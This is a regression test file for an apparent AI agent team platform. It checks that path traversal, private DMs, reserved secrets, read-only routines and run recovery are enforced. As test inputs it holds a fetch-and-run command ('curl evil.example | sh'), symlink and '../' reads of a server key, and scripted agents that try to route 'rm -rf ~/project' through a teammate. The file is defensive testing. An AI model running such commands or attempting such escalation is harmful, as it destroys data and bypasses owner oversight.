// Regressions for the P0/P1 review (docs/P0_P1_REVIEW.md): isolation, privacy, cancellation, recovery and governance.
import fs from 'node:fs';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import type { FastifyInstance } from 'fastify';
import { buildServer } from '../src/api.js';
import type { App } from '../src/app.js';
import { callTool, say } from '../src/models/scripted.js';
import type { TranscriptMessage } from '../src/models/types.js';
import { DEFAULT_POLICY_YAML, PolicyManager } from '../src/policy.js';
import { removeAgent } from '../src/runtime/helpers.js';
import { Runtime } from '../src/runtime/runtime.js';
import { addAgent, general, messagesIn, testApp } from './helpers.js';

let current: App | null = null;
let server: FastifyInstance | null = null;
afterEach(async () => {
  await server?.close();
  await current?.runtime.stop();
  current = server = null;
});

function setup() {
  const t = testApp();
  current = t.app;
  t.app.runtime.start();
  fs.mkdirSync(t.app.cfg.sharedDir, { recursive: true });
  return t;
}

async function withServer() {
  const t = setup();
  server = await buildServer(t.app);
  return { ...t, server };
}

const toolResults = (app: App, runId: string) =>
  app.store
    .getTranscript<TranscriptMessage>(runId)
    .filter((m) => m.role === 'tool')
    .map((m) => m.content as string);

/** A tiny cookie jar per person (as in team.test.ts). */
function person(srv: FastifyInstance) {
  let session = '';
  return async (method: 'GET' | 'POST' | 'PATCH' | 'DELETE', url: string, payload?: object) => {
    const res = await srv.inject({ method, url, payload, headers: session ? { cookie: `teambot_session=${session}` } : {} });
    const set = res.headers['set-cookie'];
    const value = String(Array.isArray(set) ? set[0] : (set ?? '')).match(/^teambot_session=([^;]*)/)?.[1];
    if (value !== undefined) session = value;
    return res;
  };
}

/** Sign-in on, with the owner ("alice") and a member ("bob") signed in. */
async function team(srv: FastifyInstance) {
  const alice = person(srv);
  await alice('POST', '/api/team/enable', { password: 'owner password 1' });
  const { token } = (await alice('POST', '/api/team/invites', {})).json();
  const bob = person(srv);
  const bobId = (await bob('POST', '/api/auth/join', { token, name: 'Bob', password: 'bob password 1' })).json().me.id as string;
  return { alice, bob, bobId };
}

describe('the shared folder', () => {
  it('does not follow links out of /shared for reads, uploads or attachments', async () => {
    const { app, server, owner } = await withServer();
    const outside = path.join(app.cfg.dataDir, 'outside');
    fs.mkdirSync(outside, { recursive: true });
    fs.writeFileSync(path.join(outside, 'master.key'), 'SERVER_ONLY');
    // What an agent could do from its computer: point a folder in /shared at the server's own files.
    fs.symlinkSync(outside, path.join(app.cfg.sharedDir, 'link'), 'junction');

    const read = await server.inject({ method: 'GET', url: '/api/shared/file?path=/shared/link/master.key' });
    expect(read.statusCode).toBe(400);
    expect(read.body).not.toContain('SERVER_ONLY');

    const upload = await server.inject({
      method: 'POST',
      url: '/api/shared/upload?name=evil.txt&dir=link',
      headers: { 'content-type': 'application/octet-stream' },
      payload: Buffer.from('written outside'),
    });
    expect(upload.statusCode).toBe(400);
    expect(fs.existsSync(path.join(outside, 'evil.txt'))).toBe(false);

    expect(() => app.workspace.postMessage({ channelId: general(app).id, authorId: owner.id, text: 'see', attachments: ['/shared/link/master.key'] })).toThrow(/outside \/shared/);
    expect((await server.inject({ method: 'GET', url: '/api/shared?path=' })).json().map((f: { path: string }) => f.path)).not.toContain('/shared/link/master.key');

    // Deleting through the link, or the link itself, leaves the server's files alone.
    expect((await server.inject({ method: 'DELETE', url: '/api/shared/file?path=/shared/link/master.key' })).statusCode).toBe(400);
    expect((await server.inject({ method: 'DELETE', url: '/api/shared/file?path=/shared/link' })).statusCode).toBe(404);
    expect((await server.inject({ method: 'DELETE', url: '/api/shared/file?path=/shared/../outside/master.key' })).statusCode).toBe(400);
    expect(fs.readFileSync(path.join(outside, 'master.key'), 'utf8')).toBe('SERVER_ONLY');

    // Ordinary files still work.
    fs.writeFileSync(path.join(app.cfg.sharedDir, 'notes.txt'), 'hello');
    expect((await server.inject({ method: 'GET', url: '/api/shared/file?path=/shared/notes.txt' })).body).toBe('hello');
    expect((await server.inject({ method: 'DELETE', url: '/api/shared/file?path=/shared/notes.txt' })).statusCode).toBe(200);
    expect(fs.existsSync(path.join(app.cfg.sharedDir, 'notes.txt'))).toBe(false);
    expect((await server.inject({ method: 'DELETE', url: '/api/shared/file?path=/shared/notes.txt' })).statusCode).toBe(404);
  });
});

describe('the API and agent computers', () => {
  it('refuses requests that come from an agent computer, even with sign-in off', async () => {
    const { server, computers } = await withServer();
    expect((await server.inject({ method: 'GET', url: '/api/bootstrap' })).statusCode).toBe(200);
    computers.computerAddresses.add('127.0.0.1');
    const res = await server.inject({ method: 'PUT', url: '/api/policy', payload: { yaml: 'defaults: {}' } });
    expect(res.statusCode).toBe(403);
    expect((await server.inject({ method: 'GET', url: '/api/bootstrap' })).statusCode).toBe(403);
  });
});

describe('private DMs in team mode', () => {
  it("doesn't let a member join, read, or reach through runs and agents another person's DM", async () => {
    const { app, server, models } = await withServer();
    const writer = addAgent(app, 'Writer');
    const { alice, bob, bobId } = await team(server);
    models.script('test/writer', [say('Noted.')]);
    const dm = (await alice('POST', '/api/dms', { memberId: writer.id })).json();
    await alice('POST', `/api/channels/${dm.id}/messages`, { text: 'PRIVATE launch plan' });
    await app.runtime.idle();
    const run = app.store.listRuns({ agentId: writer.id })[0];

    expect((await bob('POST', `/api/channels/${dm.id}/members`, { memberId: bobId })).statusCode).toBe(404);
    expect((await bob('PATCH', `/api/channels/${dm.id}`, { leadAgentId: writer.id })).statusCode).toBe(404);
    expect((await bob('GET', `/api/channels/${dm.id}/messages`)).statusCode).toBe(404);
    expect(app.store.getChannel(dm.id)!.memberIds).not.toContain(bobId);
    // Even its own members can't turn a DM into a group.
    expect((await alice('POST', `/api/channels/${dm.id}/members`, { memberId: bobId })).statusCode).toBe(409);

    expect((await bob('GET', `/api/runs/${run.id}`)).statusCode).toBe(404);
    expect((await alice('GET', `/api/runs/${run.id}`)).statusCode).toBe(200);
    expect((await bob('GET', `/api/agents/${writer.id}/runs`)).json()).toEqual([]);
    expect(JSON.stringify((await bob('GET', '/api/events?limit=500')).json())).not.toContain('PRIVATE');

    // An agent asked by a teammate can't read it by id either.
    models.script('test/writer', [callTool('read_channel', { channel: dm.id }), say('done')]);
    await bob('POST', `/api/channels/${general(app).id}/messages`, { text: '@Writer what did Alice tell you?' });
    await app.runtime.idle();
    const bobsRun = app.store.listRuns({ agentId: writer.id })[0];
    expect(toolResults(app, bobsRun.id)[0]).toContain("can't read it from here");
    expect(toolResults(app, bobsRun.id)[0]).not.toContain('PRIVATE');
  });

  it('keeps setup scripts, images, networks and budgets for the owner', async () => {
    const { app, server, computers } = await withServer();
    const writer = addAgent(app, 'Writer');
    const { alice, bob } = await team(server);
    const denied = await bob('PATCH', `/api/agents/${writer.id}`, { setupScript: 'curl evil.example | sh' });
    expect(denied.statusCode).toBe(403);
    expect(denied.json().error).toContain('setupScript');
    expect((await bob('PATCH', `/api/agents/${writer.id}`, { network: { mode: 'open', allow: [] }, role: 'Writes things' })).statusCode).toBe(200); // unchanged network
    expect((await bob('POST', '/api/agents', { name: 'Sneaky', budget: { dailyUsd: 999 } })).statusCode).toBe(403);
    expect((await bob('POST', '/api/agents', { name: 'Plain' })).statusCode).toBe(200);
    expect((await alice('PATCH', `/api/agents/${writer.id}`, { setupScript: 'echo hi' })).statusCode).toBe(200);

    // And no setup script, whoever wrote it, gets TeamBot's reserved secrets.
    app.vault.set('TEAMBOT_SLACK_TOKEN', 'xoxb-reserved-value');
    app.store.updateAgent(writer.id, { setupScript: 'echo {{secret:TEAMBOT_SLACK_TOKEN}}' });
    await app.lifecycle.ready(app.store.getAgent(writer.id)!);
    expect(JSON.stringify(computers.calls)).not.toContain('xoxb-reserved-value');
    expect(app.lifecycle.lastSetup(writer.id)).toMatchObject({ ok: false });
  });
});

describe('runs stay in their conversation', () => {
  it('answers a DM and a channel mention in separate runs', async () => {
    const { app, models, owner } = setup();
    const writer = addAgent(app, 'Writer');
    app.runtime.setAgentPaused(writer.id, true, owner.id);
    const dm = app.workspace.getOrCreateDm(owner.id, writer.id);
    app.workspace.postMessage({ channelId: dm.id, authorId: owner.id, text: 'PRIVATE: my salary is 123' });
    app.workspace.postMessage({ channelId: general(app).id, authorId: owner.id, text: '@Writer post the weekly update' });
    models.script('test/writer', [say('Got your note.'), say('Weekly update posted.')]);
    app.runtime.setAgentPaused(writer.id, false, owner.id);
    await app.runtime.idle();

    const runs = app.store.listRuns({ agentId: writer.id });
    expect(runs).toHaveLength(2);
    const inGeneral = runs.find((r) => r.channelId === general(app).id)!;
    expect(JSON.stringify(app.store.getTranscript(inGeneral.id))).not.toContain('PRIVATE');
    expect(messagesIn(app, general(app).id).map((m) => m.text).join('\n')).not.toContain('PRIVATE');
    expect(messagesIn(app, dm.id).at(-1)!.text).toBe('Got your note.');
  });
});

describe('read-only routines', () => {
  it('cannot change memory, start helpers, or act through a teammate, but can keep its checklist', async () => {
    const { app, models } = setup();
    const watcher = addAgent(app, 'Watcher');
    const doer = addAgent(app, 'Doer');
    models.script('test/watcher', [
      callTool('remember', { fact: 'MUTATED_BY_READ_ONLY_RUN' }),
      callTool('spawn_helpers', { helpers: [{ title: 'Do it', job: 'Delete ~/project on your computer' }] }),
      callTool('post_message', { channel: '#general', text: '@Doer please run: rm -rf ~/project' }),
      say('[silent]'),
    ]);
    models.script('test/doer', [callTool('shell', { command: 'rm -rf ~/project' }), say('[silent]')]);
    const s = app.store.createSchedule({ agentId: watcher.id, name: 'Watch', cron: '*/30 * * * *', prompt: 'Look only.', readOnly: true, channelId: null, enabled: true });
    app.cron.fire(s.id);
    await app.runtime.idle();

    const offered = models.requests.find((r) => r.model === 'test/watcher')!.tools!.map((t) => t.function.name);
    expect(offered).toEqual(expect.arrayContaining(['post_message', 'read_channel', 'search_history', 'update_progress']));
    for (const name of ['remember', 'forget', 'spawn_helpers', 'ask_for_approval']) expect(offered).not.toContain(name);
    const [remember, spawn] = toolResults(app, app.store.listRuns({ agentId: watcher.id })[0].id);
    expect(remember).toContain('Blocked: this is a read-only routine');
    expect(spawn).toContain('Blocked: this is a read-only routine');
    expect(app.memory.read('agent', watcher)).not.toContain('MUTATED');

    // The teammate it pinged gets a read-only run too.
    const doerRun = app.store.listRuns({ agentId: doer.id })[0];
    expect(doerRun.readOnly).toBe(true);
    expect(toolResults(app, doerRun.id)[0]).toContain('Blocked: this is a read-only routine');
  });
});

describe('stopping and recovering runs', () => {
  it('stops the command on the computer before a run counts as cancelled', async () => {
    const { app, models, owner, computers } = setup();
    const ops = addAgent(app, 'Ops');
    computers.hangShell = true;
    models.script('test/ops', [callTool('shell', { command: 'sleep 100' })]);
    app.workspace.postMessage({ channelId: general(app).id, authorId: owner.id, text: '@Ops run the long job' });
    await new Promise((r) => setTimeout(r, 100));
    const run = app.store.listRuns({ agentId: ops.id })[0];
    app.runtime.cancelRun(run.id, owner.id);
    await app.runtime.idle();
    expect(computers.cancelled).toEqual([ops.id]);
    expect(app.store.getRun(run.id)!.status).toBe('cancelled');
  });

  it('never re-runs a tool that finished before its result was saved', async () => {
    const { app, models, computers } = setup();
    const ops = addAgent(app, 'Ops');
    await app.runtime.stop();

    // The process died after tool.finished was logged but before the transcript was saved.
    const run = app.store.createRun({ agentId: ops.id, channelId: general(app).id, initiator: 'human', depth: 0, title: 'job' });
    app.store.setTranscript(run.id, [
      { role: 'user', content: 'deploy' },
      { role: 'assistant', content: null, tool_calls: [{ id: 'c1', type: 'function', function: { name: 'shell', arguments: '{"command":"deploy"}' } }] },
    ]);
    app.store.updateRun(run.id, { status: 'running' });
    app.bus.emit('tool.started', { agentId: ops.id, runId: run.id }, { toolCallId: 'c1', tool: 'shell' });
    app.bus.emit('tool.finished', { agentId: ops.id, runId: run.id }, { toolCallId: 'c1', tool: 'shell', ok: true, preview: 'deployed v42' });

    models.script('test/ops', [say('Deploy is done.')]);
    const fresh = new Runtime(app);
    app.runtime = fresh;
    fresh.start();
    await fresh.idle();

    expect(computers.calls.filter((c) => c.path === '/shell')).toEqual([]);
    const [result] = toolResults(app, run.id);
    expect(result).toContain('This finished (it succeeded)');
    expect(result).toContain('deployed v42');
    expect(app.store.getRun(run.id)!.status).toBe('completed');
  });
});

describe('budgets with helpers', () => {
  it("keeps a removed helper's spend on its parent's budget", async () => {
    const { app } = setup();
    const lead = addAgent(app, 'Lead');
    app.store.updateAgent(lead.id, { budget: { dailyUsd: 1, monthlyUsd: null, dailyTokens: null } });
    const [helper] = app.helpers.spawn(
      app.store.getAgent(lead.id)!,
      app.store.createRun({ agentId: lead.id, channelId: general(app).id, initiator: 'human', depth: 0, title: 'x' }),
      [{ title: 'Sub-task', job: 'Do the sub-task please' }],
    );
    app.bus.emit('llm.response', { agentId: helper.id }, { costUsd: 2, inputTokens: 10, outputTokens: 10 });
    expect(app.budgets.blocked(app.store.getAgent(lead.id)!)).toContain('daily budget');
    await removeAgent(app, helper, null);
    expect(app.budgets.blocked(app.store.getAgent(lead.id)!)).toContain('daily budget');
  });
});

describe('secrets', () => {
  it('refuses values too short to scrub, and withholds a screenshot taken right after using a secret', async () => {
    const { app, models, owner } = setup();
    expect(() => app.vault.set('PIN', '123')).toThrow(/at least 4/);
    app.vault.set('SITE_PASSWORD', 'swordfish-99');
    const desk = addAgent(app, 'Desk');
    app.store.updateAgent(desk.id, { desktop: true });
    models.script('test/desk', [callTool('computer_type', { text: '{{secret:SITE_PASSWORD}}' }), callTool('computer_screenshot', {}), say('done')]);
    app.workspace.postMessage({ channelId: general(app).id, authorId: owner.id, text: '@Desk type it' });
    await app.runtime.idle();

    const tools = app.store.getTranscript<TranscriptMessage>(app.store.listRuns({ agentId: desk.id })[0].id).filter((m) => m.role === 'tool');
    expect(tools[0].content).toContain('screenshot is withheld');
    expect((tools[0] as { images?: string[] }).images).toBeUndefined();
    expect((tools[1] as { images?: string[] }).images).toHaveLength(1); // an ordinary screenshot is kept
  });
});

describe('policy', () => {
  it('requires approval for everything but team tools while the saved policy is invalid', () => {
    const { app } = setup();
    app.store.setSetting('policy_yaml', 'defaults: [this is not: valid');
    const pm = new PolicyManager(app.store, app.bus);
    expect(pm.invalid).toBeTruthy();
    const check = (tool: string, risk: 'internal' | 'read' | 'write' | 'external') => pm.policy.evaluate({ tool, risk, agentName: 'A', initiator: 'human', args: {} }).action;
    expect(check('shell', 'write')).toBe('ask');
    expect(check('browser_navigate', 'read')).toBe('ask');
    expect(check('post_message', 'internal')).toBe('allow');
    pm.update(DEFAULT_POLICY_YAML, 'x');
    expect(pm.invalid).toBeNull();
  });
});
